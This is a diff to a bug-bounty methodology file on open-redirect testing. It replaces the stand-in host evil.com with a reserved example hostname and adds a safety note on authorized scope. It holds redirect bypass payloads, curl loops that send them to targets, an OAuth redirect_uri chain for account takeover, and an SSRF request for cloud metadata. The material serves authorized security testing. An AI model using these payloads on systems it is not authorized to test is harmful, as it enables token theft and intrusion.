@@ -75,18 +75,18 @@ Open redirect alone is Low. Chained to OAuth = Critical (ATO).
 
 | Technique | Payload |
 |-----------|---------|
-| Basic | `https://evil.com` |
-| Protocol relative | `//evil.com` |
-| Backslash bypass | `/\\evil.com` |
-| At-sign confusion | `https://target.com@evil.com` |
-| Double slash | `//evil.com/%2F..` |
-| URL encoding | `%2Fevil.com` |
-| Null byte | `evil.com%00target.com` |
-| Whitespace | `evil.com%09` or `%20` |
-| JavaScript URI | `javascript:window.location='https://evil.com'` |
-| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
-| Subdomain | `https://target.com.evil.com` |
-| Fragment | `https://evil.com#.target.com` |
+| Basic | `https://redirect-test.example` |
+| Protocol relative | `//redirect-test.example` |
+| Backslash bypass | `/\\redirect-test.example` |
+| At-sign confusion | `https://target.com@redirect-test.example` |
+| Double slash | `//redirect-test.example/%2F..` |
+| URL encoding | `%2Fredirect-test.example` |
+| Null byte | `redirect-test.example%00target.com` |
+| Whitespace | `redirect-test.example%09` or `%20` |
+| JavaScript URI | `javascript:window.location='https://redirect-test.example'` |
+| Data URI | `data:text/html,<script>window.location='https://redirect-test.example'</script>` |
+| Subdomain | `https://target.com.redirect-test.example` |
+| Fragment | `https://redirect-test.example#.target.com` |
 
 ---
 
@@ -105,7 +105,7 @@ grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|log
 
 ### Phase 2 — Basic Test
 ```bash
-COLLAB="https://evil.com"
+COLLAB="https://redirect-test.example"
 cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
   LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
   STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
@@ -117,12 +117,12 @@ done
 ```bash
 BASE_URL="https://$TARGET/redirect?url="
 PAYLOADS=(
-  "https://evil.com"
-  "//evil.com"
-  "/\\evil.com"
-  "https://$TARGET@evil.com"
-  "https://evil.com%23.$TARGET"
-  "https://evil.com%09"
+  "https://redirect-test.example"
+  "//redirect-test.example"
+  "/\\redirect-test.example"
+  "https://$TARGET@redirect-test.example"
+  "https://redirect-test.example%23.$TARGET"
+  "https://redirect-test.example%09"
 )
 for P in "${PAYLOADS[@]}"; do
   LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
@@ -135,7 +135,7 @@ Server-side `Location:` grepping misses redirects that happen purely in JS. Sour
 ```bash
 grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
   | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
-# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.com  (or ?url=...)
+# Confirm in a browser (curl can't): open  https://$TARGET/page#https://redirect-test.example  (or ?url=...)
 # Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
 ```
 (PortSwigger: DOM-based open redirection.)
@@ -147,15 +147,15 @@ grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20
 
 # Construct OAuth URL with open redirect as redirect_uri
 # Normal: redirect_uri=https://target.com/callback
-# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
+# Attack: redirect_uri=https://target.com/redirect?url=https://redirect-test.example
 OAUTH_URL="https://$TARGET/oauth/authorize"
-curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
+curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fredirect-test.example" 2>&1 | grep -i "location:"
 ```
 
 ### Phase 5 — Server-Side Redirect (SSRF escalation)
 ```bash
 # If the app fetches the redirect target server-side (302 fetch follow)
-curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
+curl -s "https://$TARGET/proxy?url=https://redirect-test.example/redirect-to-169.254.169.254/latest/meta-data/"
 
 # Or: if app makes HTTP request to the redirect destination
 curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
@@ -168,13 +168,13 @@ curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
 ```bash
 # openredirex
 pip3 install openredirex
-openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com
+openredirex -l recon/$TARGET/redirect-candidates.txt -p redirect-test.example
 
 # nuclei
 nuclei -u https://$TARGET -t redirect/ -severity medium,high
 
 # gf + qsreplace
-cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
+cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://redirect-test.example" | \
   xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
 ```
 
@@ -193,7 +193,7 @@ cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
 
 ## Validation
 
-✅ Location header in response points to evil.com (your controlled domain)
+✅ Location header in response points to redirect-test.example (your controlled domain)
 ✅ Browser follows redirect to attacker-controlled page
 
 **Severity:**
@@ -221,3 +221,5 @@ cat scope.txt  # target list from the authorized engagement brief
 ```
 
 > Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+
+`redirect-test.example` is a reserved illustrative hostname, not a live callback service. For network proof use a domain explicitly controlled and approved for this assessment; never send tokens to a third-party domain. OAuth redirect behavior alone does not establish account takeover: verify client binding, PKCE, exact redirect policy and actual impact using test accounts. For SSRF chains use a controlled canary, not cloud metadata credentials or internal secret extraction. Rate severity from demonstrated scope/impact.
